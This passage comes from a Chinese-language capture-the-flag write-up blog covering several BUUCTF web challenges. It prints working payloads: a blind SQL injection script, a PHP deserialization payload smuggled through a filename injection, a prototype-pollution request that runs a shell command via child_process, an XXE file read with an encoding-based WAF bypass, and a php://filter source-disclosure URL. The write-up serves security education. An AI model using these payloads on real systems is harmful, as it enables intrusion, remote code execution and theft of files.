class="hljs-built_in">hex</span>(result)[<span class="hljs-number">2</span>:]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> return_result<br><br><br><span class="hljs-comment"># 获取数据库</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;</span>))<br><br><span class="hljs-comment"># 获取数据库表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取数据库表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27; AND TABLE_NAME = &#x27;F4l9_t4b1e&#x27; &quot;</span>))<br><br><span class="hljs-comment"># 获取表中内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="hljs-string">&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;</span>))<br><br></code></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>好久没看到这种信息泄露了</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061021338.png" srcset="/img/loading.gif" lazyload alt="image-20220206102059166"></p>
<p>github可以找到源码</p>
<p>在show.php  发现反序列化函数</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061038161.png" srcset="/img/loading.gif" lazyload alt="image-20220206103848072"></p>
<p>在helper.php发现序列化函数</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061040606.png" srcset="/img/loading.gif" lazyload alt="image-20220206104029523"></p>
<p>这里upload.php实际调用 upload函数，将图片长宽序列化存入数据库中</p>
<p>然后我在helper.php中还发现了文件读取函数</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061101116.png" srcset="/img/loading.gif" lazyload alt="image-20220206110122053"></p>
<p>​     几个成员属性可控，而且helper析构函数自动调用 view_files</p>
<p>于是有exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">True</span>; <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-keyword">new</span> helper());<br><span class="hljs-variable">$result</span>=str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>这里上传的内容已经搞出来了</p>
<p>但是由于上传内容中不能含有双引号 所以这里还要进一步处理</p>
<p><code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code> &#x3D;&gt;</p>
<p><code>0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code></p>
<p>这个16进制全编码推荐hackbar</p>
<p>可以发现helper.php中存在</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$basename</span> = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br>	<span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>	<span class="hljs-variable">$ext</span> = substr(strrchr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>	<span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>	&#125;<br>    <span class="hljs-variable">$title</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里文件名可控也就是,$File[“name”]&#x3D;&gt;filename 而$title的值由于它有关</p>
<p>那么这里补位，然后再闭合</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">3</span>a<span class="hljs-number">363</span>a<span class="hljs-number">2268656</span>c<span class="hljs-number">706572223</span>a<span class="hljs-number">323</span>a<span class="hljs-number">7</span>b<span class="hljs-number">733</span>a<span class="hljs-number">393</span>a<span class="hljs-number">225</span>c<span class="hljs-number">305</span>c<span class="hljs-number">305</span>c<span class="hljs-number">30696676696577223</span>b<span class="hljs-number">623</span>a<span class="hljs-number">313</span>b<span class="hljs-number">733</span>a<span class="hljs-number">393</span>a<span class="hljs-number">225</span>c<span class="hljs-number">305</span>c<span class="hljs-number">305</span>c<span class="hljs-number">30636</span>f<span class="hljs-number">6</span>e<span class="hljs-number">666967223</span>b<span class="hljs-number">733</span>a<span class="hljs-number">353</span>a<span class="hljs-number">222</span>f<span class="hljs-number">666</span>c<span class="hljs-number">6167223</span>b<span class="hljs-number">7</span>d),(&#x27;<span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure>

<p>对应</p>
<p><code>&#39;title&#39;=&gt;$title,&#39;filename&#39;=&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;=&gt;$ext,&#39;path&#39;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext</code></p>
<p>然后去show.php就可以看到flag了</p>
<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061213039.png" srcset="/img/loading.gif" lazyload alt="image-20220206121326956"></p>
<p>整体功能由js实现，访问<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>注册用户时不能有admin，然后我们又在注册用户的代码中发现下面这部分</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">req.session.user=&#123;<br>     <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>     <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>     <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>   &#125;<br></code></pre></td></tr></table></figure>

<p>这里对user的值取大写，大小写变换的字符都可能引发安全问题，存在于个js大小写字符转化的特例</p>
<p>P神的文章有讲解：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>“K”.toLowerCase() &#x3D;&#x3D; ‘k’</p>
<p>“ı”.toUpperCase() &#x3D;&#x3D; ‘I’，”ſ”.toUpperCase() &#x3D;&#x3D; ‘S’</p>
<p>admin &#x3D;&gt;admın。这个登录注册居然在一起放着 好吧 ，得到flag位置</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061511274.png" srcset="/img/loading.gif" lazyload alt="image-20220206151105183"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br></code></pre></td></tr></table></figure>

<p>这个地方会构成原型链污染攻击</p>
<p>然后发现</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>这个 OutputFuctioname可控还可以用来rce，直接打了</p>
<p>数据包如下 主要是贴上json的恶意字符串，然后修改 Content-Type:application&#x2F;json</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>156<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; session=s%3AiHKzS2MMwFKjL4YzWFrTZ5d5NUdnGs76.qIS0v1KDbJW%2B5pandbezjfmES5lkFmRuTy9svZ1JW1o<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="json">&#123;<span class="hljs-attr">&quot;lua&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="hljs-attr">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure>

<p>然后刷新页面即可，这个也可以连接到你的服务器上面</p>
<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>我自己试了试文件上传的姿势都不行,结合题目给的xml源码应该是考察的xxe相关考点</p>
<p>&#x2F;about 提示flag在 &#x2F;flag</p>
<p> 构造</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">users</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>但是被waf拦住了</p>
<p>通过转换编码来绕过</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>iconv -f utf8 -t utf-16 1.xml &gt; 2.xml<br></code></pre></td></tr></table></figure>

<p>然后直接上传即可getflag</p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>Please upload a PNG image less than 256kB and smaller than 256px*256px.</p>
<p>这是题目的要求</p>
<p>这里可以直接去除图片的数据块，只留头部和IHDR标志位</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062033871.png" srcset="/img/loading.gif" lazyload alt="image-20220206203354766"></p>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>啊这，访问 register.php注册一个账号</p>
<p>使用伪协议读取源码 user.php</p>
<p>​    <code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81/user.php?page=php://filter/convert.base64-encode/resource=user</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    Header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            Header(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br>filter_directory();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    Header(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span 